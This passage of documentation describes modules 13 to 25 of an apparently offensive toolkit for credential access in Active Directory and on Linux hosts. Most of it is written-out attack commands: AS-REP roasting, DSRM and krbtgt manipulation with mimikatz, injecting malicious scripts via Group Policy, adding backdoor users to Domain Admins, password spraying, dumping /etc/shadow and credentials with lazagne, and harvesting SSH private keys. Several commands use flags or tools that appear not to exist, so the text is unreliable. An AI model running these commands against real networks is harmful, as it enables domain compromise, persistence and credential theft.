---

### 13. NPUsersEnumeratorModule
**ID:** `cred-npusers` | **Risk:** LOW | **File:** `NPUsersEnumeratorModule.java`
**Tools:** `impacket`, `crackmapexec`, `nmap`, `ldapsearch`, `rpcclient`

#### Execution Modes:

- **`ENUM`** (Short Name: `ENUM`)
    - **Purpose**: Enumerate users with "Do not require Kerberos preauthentication" without credentials.
    - **Input Schema**: `{ target: String, domain: String, user_file: Path }`
    - **Multi-Tool Command Logic**:
        1. `impacket-GetNPUsers <domain>/ -usersfile <user_file> -no-pass -dc-ip <target>` (Core Enumeration)
        2. `crackmapexec ldap <target> -u <user_file> -p '' --asrep-roast` (Automated Enum)
        3. `rpcclient -U "" -N <target> -c "enumdomusers"` (RPC User Discovery)
        4. `ldapsearch -h <target> -x -s base namingContexts` (RootDSE Audit)
        5. `nmap -p 88,389 <target>` (Service Discovery)
    - **Execution Flow**: Core Enum -> Automated Enum -> RPC Discovery -> RootDSE Audit -> Service Discovery.
    - **Output Generation & Artifacts**:
        - `reports/outputs/ENUM_[Timestamp]_vulnerable_users.txt`: List of identified accounts vulnerable to AS-REP roasting.
        - `reports/artifacts/ENUM_[Timestamp]_rpc_user_list.json`: Inventory of domain users discovered via RPC.
        - `reports/analysis/ENUM_[Timestamp]_service_map.json`: Map of identified Kerberos and LDAP services.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 14. DSRMSyncModule
**ID:** `cred-dsrm-sync` | **Risk:** CRITICAL | **File:** `DSRMSyncModule.java`
**Tools:** `mimikatz`, `impacket`, `crackmapexec`, `nmap`, `rpcclient`

#### Execution Modes:

- **`SYNC`** (Short Name: `SYNC`)
    - **Purpose**: Synchronize the DSRM administrator password with a domain account password.
    - **Input Schema**: `{ target: String, user: String, hash: String }`
    - **Multi-Tool Command Logic**:
        1. `mimikatz "privilege::debug" "lsadump::dsrm /user:<user> /ntlm:<hash>"` (Core DSRM Sync)
        2. `impacket-secretsdump -hashes <hash> <user>@<target>` (Verification Dump)
        3. `crackmapexec smb <target> -u <user> -H <hash> --lsa` (Registry Audit)
        4. `rpcclient -U <user>%<hash> <target> -c "srvinfo"` (RPC Context)
        5. `nmap -p 445 <target>` (Service Liveness)
    - **Execution Flow**: Core DSRM Sync -> Verification Dump -> Registry Audit -> RPC Context -> Liveness.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SYNC_[Timestamp]_dsrm_report.json`: Detailed report on the DSRM password synchronization.
        - `reports/artifacts/SYNC_[Timestamp]_mimikatz_log.txt`: Mimikatz execution telemetry for the DSRM operation.
        - `reports/analysis/SYNC_[Timestamp]_system_health.json`: Verification report of the target DC's security state.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 15. GPOModifyModule
**ID:** `cred-gpo-modify` | **Risk:** CRITICAL | **File:** `GPOModifyModule.java`
**Tools:** `impacket`, `crackmapexec`, `smbclient`, `nmap`, `ldapsearch`

#### Execution Modes:

- **`PUSH`** (Short Name: `PUSH`)
    - **Purpose**: Modify Group Policy Objects to deploy malicious scripts or configurations.
    - **Input Schema**: `{ target: String, gpo_id: String, script_path: Path }`
    - **Multi-Tool Command Logic**:
        1. `smbclient // <target>/SYSVOL -c "put <script_path> <gpo_id>\..."` (Core GPO Injection)
        2. `crackmapexec smb <target> -u admin -p pass --gpo-apply` (Force GPO Apply)
        3. `impacket-secretsdump admin@<target>` (Verification Audit)
        4. `ldapsearch -h <target> -x -b "CN=Policies,CN=System,dc=..."` (GPO Discovery)
        5. `nmap -p 445 <target>` (Service Liveness)
    - **Execution Flow**: Core Injection -> GPO Apply -> Verification -> Discovery -> Liveness.
    - **Output Generation & Artifacts**:
        - `reports/outputs/PUSH_[Timestamp]_gpo_audit.json`: Log of the GPO modification and deployment status.
        - `reports/artifacts/PUSH_[Timestamp]_deployed_script.ps1`: Copy of the script deployed via Group Policy.
        - `reports/analysis/PUSH_[Timestamp]_sysvol_access.json`: Audit of permissions for the SYSVOL directory.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 16. SPNAddModule
**ID:** `cred-spn-add` | **Risk:** HIGH | **File:** `SPNAddModule.java`
**Tools:** `impacket`, `crackmapexec`, `ldapsearch`, `nmap`, `rpcclient`

#### Execution Modes:

- **`ADD`** (Short Name: `ADD`)
    - **Purpose**: Add a Service Principal Name (SPN) to a target account for Kerberoasting.
    - **Input Schema**: `{ target_user: String, spn: String, domain: String }`
    - **Multi-Tool Command Logic**:
        1. `impacket-addspn -u <target_user> -s <spn> -dc-ip <dc>` (Core SPN Add)
        2. `crackmapexec ldap <dc> -u admin -p pass --add-spn <spn>` (Automated Add)
        3. `ldapsearch -h <dc> -x -b "dc=..." "(sAMAccountName=<target_user>)"` (Verification)
        4. `rpcclient -U admin%pass <dc> -c "queryuser <target_user>"` (User Audit)
        5. `nmap -p 389 <dc>` (LDAP Port Check)
    - **Execution Flow**: Core Add -> Automated Add -> Verification -> User Audit -> Port Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/ADD_[Timestamp]_spn_report.json`: Detailed report on the SPN addition and account status.
        - `reports/artifacts/ADD_[Timestamp]_ldap_verification.txt`: Raw LDAP output confirming the new SPN.
        - `reports/analysis/ADD_[Timestamp]_account_integrity.json`: Integrity report for the modified domain account.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 17. UserCreateModule
**ID:** `cred-user-create` | **Risk:** CRITICAL | **File:** `UserCreateModule.java`
**Tools:** `impacket`, `crackmapexec`, `rpcclient`, `smbclient`, `nmap`

#### Execution Modes:

- **`CREATE`** (Short Name: `CREATE`)
    - **Purpose**: Create a new domain or local user account for persistent access.
    - **Input Schema**: `{ target: String, user: String, pass: Password }`
    - **Multi-Tool Command Logic**:
        1. `impacket-addcomputer -dc-ip <target> -u <user> -p <pass> <domain>/admin:pass` (Core User Create)
        2. `crackmapexec smb <target> -u admin -p pass --exec "net user <user> <pass> /add"` (Direct Create)
        3. `rpcclient -U admin%pass <target> -c "createdomuser <user>"` (RPC User Create)
        4. `smbclient // <target>/C$ -U <user>%<pass>` (Access Verification)
        5. `nmap -p 445 <target>` (Service Liveness)
    - **Execution Flow**: Core Create -> Direct Create -> RPC Create -> Access Verification -> Liveness.
    - **Output Generation & Artifacts**:
        - `reports/outputs/CREATE_[Timestamp]_user_status.json`: Detailed report on the new user account and privileges.
        - `reports/artifacts/CREATE_[Timestamp]_auth_log.txt`: Log of the successful authentication with new credentials.
        - `reports/analysis/CREATE_[Timestamp]_system_context.json`: Technical context of the target system post-creation.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 18. GroupAddModule
**ID:** `cred-group-add` | **Risk:** CRITICAL | **File:** `GroupAddModule.java`
**Tools:** `impacket`, `crackmapexec`, `rpcclient`, `smbclient`, `nmap`

#### Execution Modes:

- **`ADD`** (Short Name: `ADD`)
    - **Purpose**: Add a user account to a privileged group (e.g., Domain Admins).
    - **Input Schema**: `{ target: String, user: String, group: String }`
    - **Multi-Tool Command Logic**:
        1. `impacket-netview -u admin -p pass -dc-ip <target>` (Group Discovery)
        2. `crackmapexec smb <target> -u admin -p pass --exec "net group \"<group>\" <user> /add /domain"` (Direct Add)
        3. `rpcclient -U admin%pass <target> -c "addgroupmember <group> <user>"` (RPC Group Add)
        4. `smbclient // <target>/ADMIN$ -U admin%pass` (Privilege Check)
        5. `nmap -p 445 <target>` (Service Liveness)
    - **Execution Flow**: Group Discovery -> Direct Add -> RPC Add -> Privilege Check -> Liveness.
    - **Output Generation & Artifacts**:
        - `reports/outputs/ADD_[Timestamp]_group_report.json`: Detailed report on the group membership modification.
        - `reports/artifacts/ADD_[Timestamp]_rpc_commands.txt`: Raw RPC output for the group addition process.
        - `reports/analysis/ADD_[Timestamp]_privilege_audit.json`: Audit of the new privileges for the targeted user.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 19. PasswordSprayerModule
**ID:** `cred-sprayer` | **Risk:** HIGH | **File:** `PasswordSprayerModule.java`
**Tools:** `crackmapexec`, `impacket`, `nmap`, `ldapsearch`, `rpcclient`

#### Execution Modes:

- **`SPRAY`** (Short Name: `SPRAY`)
    - **Purpose**: Execute a password spraying attack against a list of users.
    - **Input Schema**: `{ target: String, users: Path, pass: Password }`
    - **Multi-Tool Command Logic**:
        1. `crackmapexec smb <target> -u <users> -p <pass>` (Core SMB Spray)
        2. `impacket-GetUserSPNs -dc-ip <target> <domain>/<user>:<pass>` (Kerberos Spray)
        3. `rpcclient -U "" -N <target> -c "enumdomusers"` (User Discovery)
        4. `ldapsearch -h <target> -x -D "<user>@<domain>" -w "<pass>"` (LDAP Validation)
        5. `nmap -p 88,445 <target>` (Service Discovery)
    - **Execution Flow**: User Discovery -> Core SMB Spray -> Kerberos Spray -> LDAP Validation -> Service Discovery.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SPRAY_[Timestamp]_successful_logons.txt`: List of accounts successfully compromised via spraying.
        - `reports/artifacts/SPRAY_[Timestamp]_cme_results.json`: Full technical log of the CrackMapExec session.
        - `reports/analysis/SPRAY_[Timestamp]_lockout_check.json`: Verification of lockout policies before and after spray.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 20. KerbTGTResetModule
**ID:** `cred-tgt-reset` | **Risk:** CRITICAL | **File:** `KerbTGTResetModule.java`
**Tools:** `impacket`, `mimikatz`, `crackmapexec`, `nmap`, `rpcclient`

#### Execution Modes:

- **`RESET`** (Short Name: `RESET`)
    - **Purpose**: Reset the krbtgt account password to rotate domain trust keys.
    - **Input Schema**: `{ target: String, admin_user: String, admin_pass: Password }`
    - **Multi-Tool Command Logic**:
        1. `mimikatz "lsadump::setntlm /user:krbtgt /password:<pass>"` (Core krbtgt Reset)
        2. `impacket-secretsdump -hashes :<hash> <admin_user>@<target>` (Verification Dump)
        3. `crackmapexec smb <target> -u <admin_user> -p <admin_pass> --lsa` (Registry Audit)
        4. `rpcclient -U <admin_user>%<admin_pass> <target> -c "queryuser krbtgt"` (User Audit)
        5. `nmap -p 445 <target>` (Service Liveness)
    - **Execution Flow**: Core krbtgt Reset -> Verification Dump -> Registry Audit -> User Audit -> Liveness.
    - **Output Generation & Artifacts**:
        - `reports/outputs/RESET_[Timestamp]_krbtgt_report.json`: Detailed report on the krbtgt password reset status.
        - `reports/artifacts/RESET_[Timestamp]_mimikatz_output.txt`: Raw Mimikatz telemetry for the reset process.
        - `reports/analysis/RESET_[Timestamp]_domain_health.json`: Summary of domain trust and TGT status post-reset.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 21. ADUserEnumModule
**ID:** `cred-ad-enum` | **Risk:** LOW | **File:** `ADUserEnumModule.java`
**Tools:** `ldapsearch`, `crackmapexec`, `rpcclient`, `nmap`, `impacket`

#### Execution Modes:

- **`ENUM`** (Short Name: `ENUM`)
    - **Purpose**: Comprehensive enumeration of Active Directory users and attributes.
    - **Input Schema**: `{ target: String, domain: String, user: String, pass: Password }`
    - **Multi-Tool Command Logic**:
        1. `ldapsearch -h <target> -x -D "<user>@<domain>" -w "<pass>" -b "dc=..." "(objectClass=user)"` (Core LDAP Enum)
        2. `crackmapexec ldap <target> -u <user> -p <pass> --users` (Automated Enum)
        3. `rpcclient -U <user>%<pass> <target> -c "enumdomusers"` (RPC User Discovery)
        4. `impacket-netview -u <user> -p <pass> -dc-ip <target>` (Network View)
        5. `nmap -p 389,3268 <target>` (LDAP Port Audit)
    - **Execution Flow**: Core LDAP Enum -> Automated Enum -> RPC Discovery -> Network View -> Port Audit.
    - **Output Generation & Artifacts**:
        - `reports/outputs/ENUM_[Timestamp]_ad_users.json`: Inventory of all identified Active Directory users and attributes.
        - `reports/artifacts/ENUM_[Timestamp]_ldap_dump.ldif`: Raw LDIF dump of user objects for offline analysis.
        - `reports/analysis/ENUM_[Timestamp]_domain_structure.json`: Map of the domain OU structure and user distribution.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 22. ADSearchModule
**ID:** `cred-ad-search` | **Risk:** LOW | **File:** `ADSearchModule.java`
**Tools:** `ldapsearch`, `crackmapexec`, `impacket`, `nmap`, `python3`

#### Execution Modes:

- **`SEARCH`** (Short Name: `SEARCH`)
    - **Purpose**: Execute custom LDAP queries to discover high-value targets and misconfigurations.
    - **Input Schema**: `{ query: String, base_dn: String }`
    - **Multi-Tool Command Logic**:
        1. `ldapsearch -h <target> -x -b "<base_dn>" "<query>"` (Core LDAP Search)
        2. `crackmapexec ldap <target> -M <module_name>` (Module-Based Search)
        3. `impacket-findDelegation <domain>/<user>:<pass>` (Delegation Discovery)
        4. `python3 ad_search_helper.py --query "<query>"` (Custom Helper)
        5. `nmap -p 389 <target>` (Liveness Audit)
    - **Execution Flow**: Core LDAP Search -> Module Search -> Delegation Discovery -> Custom Helper -> Liveness.
    - **Output Generation & Artifacts**:
        - `reports/outputs/SEARCH_[Timestamp]_ad_results.json`: Results of the custom Active Directory search query.
        - `reports/artifacts/SEARCH_[Timestamp]_delegation_report.txt`: Identification of accounts with Kerberos delegation enabled.
        - `reports/analysis/SEARCH_[Timestamp]_query_telemetry.log`: Log of the LDAP search execution and response times.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 23. LocalCredentialDumperModule
**ID:** `cred-local-dump` | **Risk:** HIGH | **File:** `LocalCredentialDumperModule.java`
**Tools:** `lazagne`, `find`, `sqlite3`, `strings`, `cat`

#### Execution Modes:

- **`ALL`** (Short Name: `ALL`)
    - **Purpose**: Exhaustive local search for credentials across applications and configurations.
    - **Input Schema**: `{}`
    - **Multi-Tool Command Logic**:
        1. `lazagne all` (Core Automated Dump)
        2. `find / -name "config.xml" -o -name "*.config" 2>/dev/null` (Config Discovery)
        3. `strings /home/*/.bash_history | grep -i "pass"` (History Audit)
        4. `cat /etc/shadow 2>/dev/null` (System Shadow Audit)
        5. `sqlite3 --version` (Binary Audit)
    - **Execution Flow**: Core Dump -> Config Discovery -> History Audit -> Shadow Audit -> Binary Audit.
    - **Output Generation & Artifacts**:
        - `reports/outputs/ALL_[Timestamp]_lazagne_all.json`: Automated credential discovery report across all apps.
        - `reports/artifacts/ALL_[Timestamp]_config_files.zip`: Collection of sensitive configuration files discovered on disk.
        - `reports/analysis/ALL_[Timestamp]_history_audit.txt`: Filtered log of commands containing sensitive keywords.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 24. SSHKeyHarvestModule
**ID:** `cred-ssh-harvest` | **Risk:** HIGH | **File:** `SSHKeyHarvestModule.java`
**Tools:** `find`, `ssh-keygen`, `cat`, `scp`, `nmap`

#### Execution Modes:

- **`EXTR`** (Short Name: `EXTR`)
    - **Purpose**: Discover and collect private SSH keys and associated metadata for lateral movement.
    - **Input Schema**: `{ search_root: String }`
    - **Multi-Tool Command Logic**:
        1. `find <search_root> -name "id_*" -exec cat {} \;` (Core Extraction)
        2. `ssh-keygen -l -f <search_root>/.ssh/id_rsa` (Key Validation)
        3. `cat <search_root>/.ssh/authorized_keys` (Trust Audit)
        4. `find <search_root> -name "known_hosts"` (Target Discovery)
        5. `nmap -p 22 127.0.0.1` (System Service Audit)
    - **Execution Flow**: Core Extraction -> Key Validation -> Trust Audit -> Target Discovery -> Service Audit.
    - **Output Generation & Artifacts**:
        - `reports/payloads/EXTRACT_[Timestamp]_ssh_keys.zip`: Compressed collection of discovered private SSH keys.
        - `reports/outputs/EXTRACT_[Timestamp]_key_validation.txt`: Log of key fingerprints and cryptographic validity.
        - `reports/analysis/EXTRACT_[Timestamp]_trust_audit.json`: Detailed audit of SSH authorized_keys and trusted hosts.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.

---

### 25. CredentialAccessManager
**ID:** `cred-access-manager` | **Risk:** LOW | **File:** `CredentialAccessManager.java`
**Tools:** `impacket`, `crackmapexec`, `mimikatz`, `nmap`, `rpcclient`

#### Execution Modes:

- **`STATUS`** (Short Name: `STATUS`)
    - **Purpose**: Audit the status and readiness of all credential access tools.
    - **Input Schema**: `{}`
    - **Multi-Tool Command Logic**:
        1. `impacket-secretsdump --help` (Impacket Check)
        2. `crackmapexec --version` (CME Check)
        3. `mimikatz --version` (Mimikatz Check)
        4. `nmap --version` (Nmap Check)
        5. `rpcclient --version` (RPC Check)
    - **Execution Flow**: Impacket Check -> CME Check -> Mimikatz Check -> Nmap Check -> RPC Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/STATUS_[Timestamp]_tool_readiness.json`: Comprehensive audit of all credential access tools.
        - `reports/artifacts/STATUS_[Timestamp]_version_inventory.json`: Inventory of all identified binary versions.
        - `reports/analysis/STATUS_[Timestamp]_readiness_report.txt`: Final readiness report for the credential access category.


- **`AUDT`** (Short Name: `AUDT`)
    - **Purpose**: Verify target susceptibility and configuration for this attack vector.
    - **Input Schema**: `{ target: String }`
    - **Multi-Tool Command Logic**:
        1. `nmap -p 445 <target>` (Service Discovery)
        2. `crackmapexec smb <target> --shares` (Access Check)
        3. `impacket-rpcdump <target>` (RPC Audit)
        4. `rpcclient -U "" -N <target> -c "srvinfo"` (Null Session Check)
        5. `mimikatz --version` (Binary Check)
    - **Execution Flow**: Discovery -> Access Check -> RPC Audit -> Null Check -> Binary Check.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_vulnerability.json`: Status of related vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_context.json`: Targeting settings and environment context.